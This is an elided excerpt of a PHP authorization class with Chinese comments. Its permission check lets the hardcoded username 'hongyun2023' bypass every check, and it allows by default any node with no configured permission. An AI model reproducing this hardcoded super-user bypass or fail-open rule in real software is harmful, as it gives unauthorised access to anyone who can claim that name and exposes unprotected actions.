...
class Auth {
	...
	public static function checkAuthNode($node) {
		...
		// 超级管理员无需要验证权限
		if (session('user.username') === 'hongyun2023') {
			return true;
		}

		// 未配置权限的节点默认放行
		if (!in_array($current, self::getAuthNode())) {
			return true;
		}
	...
	public static function applyNode() {
		...
		if (($uid = session('user.id'))) {
			session('user', Db::name('SystemUser')->where('id', $uid)->find());
		}
	...
	private static function buildMenuData($menus, $nodes, $isLogin) {
		foreach ($menus as $key => &$menu) {
			if (!empty($menu['sub'])) {
				$menu['sub'] = self::buildMenuData($menu['sub'], $nodes, $isLogin);
			}
